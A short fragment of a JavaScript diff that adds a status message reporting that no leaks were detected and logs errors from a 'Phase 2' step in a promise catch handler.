+        P("  No leaks detected. Further analysis needed.","wr");
+    }
     
 }).catch(function(e) {
     Fl("Phase 2 crash: " + e.message);
